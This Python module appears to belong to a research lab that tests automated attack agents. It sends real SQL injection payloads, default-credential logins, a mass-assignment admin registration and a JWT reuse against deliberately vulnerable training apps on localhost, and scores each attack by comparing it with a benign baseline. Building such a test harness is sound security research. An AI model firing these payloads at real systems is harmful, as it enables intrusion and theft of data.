"""Capability probes with real oracles.

Each capability issues REAL requests against the local lab and returns
``(success: bool, evidence: str)``. Every oracle is a **deterministic predicate on an
actual response**, with a benign baseline so success is a measured difference rather than
an absolute guess. No probability, no rng, no fallback: if a request fails, the capability
failed (or the episode records an error) -- it is never resolved by a coin flip.

Every probe and its evidence rule was verified against the running lab; see LIVE_NOTES.md.

NON-DESTRUCTIVE: probes read, authenticate, and inject to *observe*. The one mutating
probe (VAmPI registration) creates a per-episode unique account and deletes nothing.
"""

from __future__ import annotations

import base64
import json
import re
import uuid
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional, Tuple

from .http_client import LabSession, LabUnreachable, Response

BASE = "http://127.0.0.1"

# Host index -> (name, port). Index order is the live action space.
LIVE_HOSTS: List[Tuple[str, int]] = [
    ("flask-api", 3003),
    ("vampi", 3005),
    ("juice-shop", 3001),
    ("dvwa", 3002),
    ("bwapp", 3006),
    ("webgoat", 3004),
]
# All six lab services are now in the live action space. WebGoat was initially dropped
# (lesson-scoped state); it is now included via an oracle keyed on real SQL output.

HOST_NAMES = [h for h, _ in LIVE_HOSTS]
HOST_PORTS = {h: p for h, p in LIVE_HOSTS}

# The three hosts that correspond to the simulation's host set, used for the
# like-for-like sim-vs-live transfer comparison.
SIM_EQUIVALENT = ["juice-shop", "dvwa", "flask-api"]


@dataclass
class ProbeResult:
    success: bool
    evidence: str
    requests: List[dict]


def _u(port: int, path: str) -> str:
    return f"{BASE}:{port}{path}"


# ======================================================================== flask-api 3003
def flask_foothold(s: LabSession) -> ProbeResult:
    """SQLi differential on GET /api/users?id=.

    EVIDENCE: app.py interpolates `id` straight into the SQL string, so `1 OR 1=1`
    returns every row. Success == injected row count STRICTLY GREATER than the benign
    baseline count for id=1. Exact, not heuristic.
    """
    p = HOST_PORTS["flask-api"]
    base = s.get(_u(p, "/api/users?id=1"))
    inj = s.get(_u(p, "/api/users?id=1%20OR%201=1"))
    try:
        n_base = len(base.json())
        n_inj = len(inj.json())
    except Exception:
        return ProbeResult(False, "non-JSON response; no differential",
                           [base.record.to_dict(), inj.record.to_dict()])
    ok = n_inj > n_base
    return ProbeResult(ok, f"rows baseline={n_base} injected={n_inj} (success iff injected>baseline)",
                       [base.record.to_dict(), inj.record.to_dict()])


def flask_privesc(s: LabSession) -> ProbeResult:
    """Credential auth returning an admin role.

    EVIDENCE: POST /api/login admin/admin123 -> 200 with role=="admin".
    Negative control verified: a wrong password returns HTTP 401.
    """
    p = HOST_PORTS["flask-api"]
    r = s.post(_u(p, "/api/login"), json_body={"username": "admin", "password": "admin123"})
    try:
        body = r.json()
    except Exception:
        return ProbeResult(False, f"status={r.status} non-JSON", [r.record.to_dict()])
    ok = r.status == 200 and body.get("success") is True and body.get("role") == "admin"
    return ProbeResult(ok, f"status={r.status} role={body.get('role')!r} success={body.get('success')!r}",
                       [r.record.to_dict()])


# ============================================================================ vampi 3005
def vampi_foothold(s: LabSession) -> ProbeResult:
    """Excessive data exposure: /users/v1/_debug leaks plaintext passwords.

    EVIDENCE: unauthenticated 200 whose user objects contain a `password` key.
    """
    p = HOST_PORTS["vampi"]
    r = s.get(_u(p, "/users/v1/_debug"))
    try:
        users = r.json().get("users", [])
    except Exception:
        return ProbeResult(False, f"status={r.status} non-JSON", [r.record.to_dict()])
    leaked = [u for u in users if "password" in u]
    ok = r.status == 200 and len(leaked) > 0
    return ProbeResult(ok, f"status={r.status} users={len(users)} with_password_field={len(leaked)}",
                       [r.record.to_dict()])


def vampi_privesc(s: LabSession, episode_tag: str = "") -> ProbeResult:
    """Mass assignment: register accepts an `admin` field.

    EVIDENCE: register a per-episode unique user with admin=True, then re-read
    /users/v1/_debug and confirm THAT user's admin flag is true.
    NON-DESTRUCTIVE: creates one account; deletes nothing. The admin-only DELETE route
    also succeeds with this token but is deliberately NOT used -- it would destroy lab data.
    """
    p = HOST_PORTS["vampi"]
    uname = f"artai-{episode_tag or uuid.uuid4().hex[:8]}"
    reg = s.post(_u(p, "/users/v1/register"), json_body={
        "username": uname, "password": "p", "email": f"{uname}@lab.local", "admin": True})
    dbg = s.get(_u(p, "/users/v1/_debug"))
    try:
        users = dbg.json().get("users", [])
    except Exception:
        return ProbeResult(False, f"register={reg.status} debug non-JSON",
                           [reg.record.to_dict(), dbg.record.to_dict()])
    mine = [u for u in users if u.get("username") == uname]
    ok = bool(mine) and mine[0].get("admin") is True
    ev = f"register={reg.status} user={uname} admin_flag={mine[0].get('admin') if mine else 'absent'}"
    return ProbeResult(ok, ev, [reg.record.to_dict(), dbg.record.to_dict()])


# ====================================================================== juice-shop 3001
_JS_TOKEN: Dict[int, str] = {}


def juice_foothold(s: LabSession) -> ProbeResult:
    """SQLi authentication bypass on POST /rest/user/login.

    EVIDENCE: the response carries authentication.token and that JWT's payload decodes
    to a real identity. Verified to yield admin@juice-sh.op (id=1, role=admin).
    """
    p = HOST_PORTS["juice-shop"]
    r = s.post(_u(p, "/rest/user/login"),
               json_body={"email": "' OR 1=1--", "password": "x"})
    try:
        tok = r.json()["authentication"]["token"]
    except Exception:
        return ProbeResult(False, f"status={r.status} no authentication.token", [r.record.to_dict()])
    ident = _decode_jwt_identity(tok)
    ok = bool(tok) and ident is not None
    if ok:
        _JS_TOKEN[id(s)] = tok
    return ProbeResult(ok, f"status={r.status} jwt_identity={ident}", [r.record.to_dict()])


def juice_privesc(s: LabSession) -> ProbeResult:
    """Auth-gated route differential on GET /api/Users.

    EVIDENCE: /api/Users returns 401 with no credentials and 200 with the bypass token.
    NOTE: /rest/admin/application-configuration returns 200 WITHOUT auth in this image,
    so it proves nothing and is deliberately not used (see LIVE_NOTES.md §3).
    """
    p = HOST_PORTS["juice-shop"]
    tok = _JS_TOKEN.get(id(s))
    if not tok:
        fh = juice_foothold(s)
        tok = _JS_TOKEN.get(id(s))
        if not tok:
            return ProbeResult(False, "no token available for privesc", fh.requests)
    anon = s.get(_u(p, "/api/Users"))
    auth = s.get(_u(p, "/api/Users"), headers={"Authorization": f"Bearer {tok}"})
    ok = anon.status == 401 and auth.status == 200
    return ProbeResult(ok, f"/api/Users anon={anon.status} with_token={auth.status} (success iff 401->200)",
                       [anon.record.to_dict(), auth.record.to_dict()])


def _decode_jwt_identity(tok: str) -> Optional[str]:
    try:
        payload = tok.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))["data"]
        return f"{data.get('email')}|role={data.get('role')}"
    except Exception:
        return None


# ============================================================================= dvwa 3002
def dvwa_ensure_db(s: LabSession) -> bool:
    """One-time: create DVWA's database (login never sticks without it)."""
    p = HOST_PORTS["dvwa"]
    r = s.get(_u(p, "/setup.php"))
    m = re.search(r"user_token'\s*value='([a-f0-9]+)'", r.body)
    if not m:
        return False
    s.post(_u(p, "/setup.php"),
           data={"create_db": "Create / Reset Database", "user_token": m.group(1)})
    return True


def dvwa_foothold(s: LabSession) -> ProbeResult:
    """Real authenticated session via the login form (CSRF token scraped per request).

    EVIDENCE: after POSTing admin/password, GET /index.php returns 200
    (unauthenticated it 302-redirects to login.php).
    """
    p = HOST_PORTS["dvwa"]
    dvwa_ensure_db(s)
    page = s.get(_u(p, "/login.php"))
    m = re.search(r"user_token'\s*value='([a-f0-9]+)'", page.body)
    if not m:
        return ProbeResult(False, "no CSRF user_token on login.php", [page.record.to_dict()])
    login = s.post(_u(p, "/login.php"), data={
        "username": "admin", "password": "password", "Login": "Login",
        "user_token": m.group(1)})
    idx = s.get(_u(p, "/index.php"))
    ok = idx.status == 200
    return ProbeResult(ok, f"login={login.status} index={idx.status} (success iff index==200)",
                       [page.record.to_dict(), login.record.to_dict(), idx.record.to_dict()])


def dvwa_privesc(s: LabSession) -> ProbeResult:
    """SQLi differential at security=low.

    EVIDENCE: `?id=1` returns 1 `First name:` occurrence; `?id=1' or '1'='1` returns 5
    (admin,Gordon,Hack,Pablo,Bob). Success iff injected occurrences > baseline.
    NOTE: count OCCURRENCES, not matching lines -- DVWA emits all rows on one line.
    """
    p = HOST_PORTS["dvwa"]
    sid = s.cookies().get("PHPSESSID")
    if not sid:
        return ProbeResult(False, "no PHPSESSID; foothold required first", [])
    hdr = {"Cookie": f"PHPSESSID={sid}; security=low"}
    base = s.get(_u(p, "/vulnerabilities/sqli/?id=1&Submit=Submit"), headers=hdr)
    inj = s.get(_u(p, "/vulnerabilities/sqli/?id=1%27+or+%271%27%3D%271&Submit=Submit"), headers=hdr)
    n_base = len(re.findall(r"First name:", base.body))
    n_inj = len(re.findall(r"First name:", inj.body))
    ok = n_inj > n_base and n_base >= 1
    return ProbeResult(ok, f"rows baseline={n_base} injected={n_inj} (success iff injected>baseline)",
                       [base.record.to_dict(), inj.record.to_dict()])


# ============================================================================ bwapp 3006
def bwapp_ensure_install(s: LabSession):
    s.get(_u(HOST_PORTS["bwapp"], "/install.php?install=yes"))


def bwapp_foothold(s: LabSession) -> ProbeResult:
    """Authenticated session as bee/bug.

    EVIDENCE: after login, portal.php returns 200 containing a `logout` link
    (unauthenticated it does not).
    """
    p = HOST_PORTS["bwapp"]
    bwapp_ensure_install(s)
    login = s.post(_u(p, "/login.php"),
                   data={"login": "bee", "password": "bug", "security_level": "0",
                         "form": "submit"})
    portal = s.get(_u(p, "/portal.php"))
    ok = portal.status == 200 and "logout" in portal.body.lower()
    return ProbeResult(ok, f"login={login.status} portal={portal.status} logout_link={'logout' in portal.body.lower()}",
                       [login.record.to_dict(), portal.record.to_dict()])


def bwapp_privesc(s: LabSession) -> ProbeResult:
    """SQLi differential on sqli_1.php.

    EVIDENCE: `title=Iron` returns 2 table cells; `title=' or 1=1#` returns 17, leaking
    rows the benign query never returns. Success iff injected cells > baseline cells.
    """
    p = HOST_PORTS["bwapp"]
    base = s.get(_u(p, "/sqli_1.php?title=Iron&action=search"))
    inj = s.get(_u(p, "/sqli_1.php?title=%27+or+1%3D1%23&action=search"))
    n_base = len(re.findall(r"<td>[A-Za-z0-9 ]+</td>", base.body))
    n_inj = len(re.findall(r"<td>[A-Za-z0-9 ]+</td>", inj.body))
    ok = n_inj > n_base and n_base >= 1
    return ProbeResult(ok, f"cells baseline={n_base} injected={n_inj} (success iff injected>baseline)",
                       [base.record.to_dict(), inj.record.to_dict()])


# ========================================================================== webgoat 3004
# Originally dropped as "lesson-scoped bookkeeping". That objection is answered by keying
# the oracle on the ACTUAL SQL OUTPUT (rows returned by the injected query) rather than on
# WebGoat's `lessonCompleted` flag. The row differential is a real attack outcome;
# lessonCompleted is only recorded as corroboration.
def webgoat_foothold(s: LabSession, episode_tag: str = "") -> ProbeResult:
    """Register a per-episode account and authenticate.

    EVIDENCE: after register+login, GET /WebGoat/start.mvc returns 200 and the page
    contains the account's own username and a Logout control (unauthenticated it
    302-redirects to /WebGoat/login).
    NOTE: WebGoat enforces a 6-10 character password, so an 11-char password silently
    fails registration and every later login returns /login?error.
    """
    p = HOST_PORTS["webgoat"]
    uname = f"artai{(episode_tag or uuid.uuid4().hex)[:8]}".replace("-", "")[:10]
    pw = "Pass123"  # must be 6-10 chars
    reg = s.post(_u(p, "/WebGoat/register.mvc"),
                 data={"username": uname, "password": pw,
                       "matchingPassword": pw, "agree": "agree"})
    login = s.post(_u(p, "/WebGoat/login"), data={"username": uname, "password": pw})
    start = s.get(_u(p, "/WebGoat/start.mvc"))
    authed = start.status == 200 and uname.lower() in start.body.lower()
    _WG_USER[id(s)] = uname
    return ProbeResult(
        authed,
        f"register={reg.status} login={login.status} start={start.status} user_on_page={authed}",
        [reg.record.to_dict(), login.record.to_dict(), start.record.to_dict()])


def webgoat_privesc(s: LabSession) -> ProbeResult:
    """SQLi on the SqlInjection lesson-8 query, measured by REAL SQL OUTPUT.

    The query is `... WHERE last_name = '<name>' AND auth_tan = '<auth_tan>'`.
    EVIDENCE: benign (Smith/3SL99A) returns 2 <tr> rows (header + own record); injecting
    `auth_tan=' OR '1'='1` returns 6 (header + all five employees), i.e. records the
    authenticated user is not entitled to. Success iff injected rows > benign rows.
    `lessonCompleted` is logged as corroboration but is NOT the predicate.
    """
    p = HOST_PORTS["webgoat"]
    ep = "/WebGoat/SqlInjection/attack8"
    benign = s.post(_u(p, ep), data={"name": "Smith", "auth_tan": "3SL99A"})
    inj = s.post(_u(p, ep), data={"name": "Smith", "auth_tan": "' OR '1'='1"})
    n_b = len(re.findall(r"<tr>", _wg_output(benign)))
    n_i = len(re.findall(r"<tr>", _wg_output(inj)))
    completed = None
    try:
        completed = inj.json().get("lessonCompleted")
    except Exception:
        pass
    ok = n_i > n_b and n_b >= 1
    return ProbeResult(
        ok,
        f"sql rows benign={n_b} injected={n_i} (success iff injected>benign; "
        f"lessonCompleted={completed} corroborating)",
        [benign.record.to_dict(), inj.record.to_dict()])


_WG_USER: Dict[int, str] = {}


def _wg_output(r: Response) -> str:
    try:
        return r.json().get("output") or ""
    except Exception:
        return r.body


# ================================================================================ registry
FOOTHOLD: Dict[str, Callable[[LabSession], ProbeResult]] = {
    "flask-api": flask_foothold,
    "vampi": vampi_foothold,
    "juice-shop": juice_foothold,
    "dvwa": dvwa_foothold,
    "bwapp": bwapp_foothold,
    "webgoat": webgoat_foothold,
}

PRIVESC: Dict[str, Callable[[LabSession], ProbeResult]] = {
    "flask-api": flask_privesc,
    "vampi": vampi_privesc,
    "juice-shop": juice_privesc,
    "dvwa": dvwa_privesc,
    "bwapp": bwapp_privesc,
    "webgoat": webgoat_privesc,
}
